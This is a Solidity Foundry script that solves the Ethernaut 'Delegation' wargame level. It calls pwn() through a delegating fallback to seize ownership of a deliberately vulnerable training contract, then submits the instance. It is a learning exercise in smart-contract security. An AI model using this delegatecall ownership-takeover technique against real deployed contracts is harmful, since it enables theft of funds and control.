// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";

import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

/**
 *
 * Level address: 0x73379d8B82Fda494ee59555f333DF7D44483fD58
 * The goal of this level is for you to claim ownership of the instance you are
 * given.
 * Things that might help
 * 1. Look into Solidity's documentation on the delegatecall low level function,
 * how it works, how it can be used to delegate operations to on-chain
 * libraries, and what implications it has on execution scope.
 * 2. Fallback methods
 * 3. Method ids
 *
 */
contract DelegationScript is Attacker {
    Level private level = Level(0x73379d8B82Fda494ee59555f333DF7D44483fD58);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Delegation delegation = Delegation(instance);

        (bool success,) =
            address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Low-level call failed");

        require(submitInstance());
        vm.stopBroadcast();
    }
}
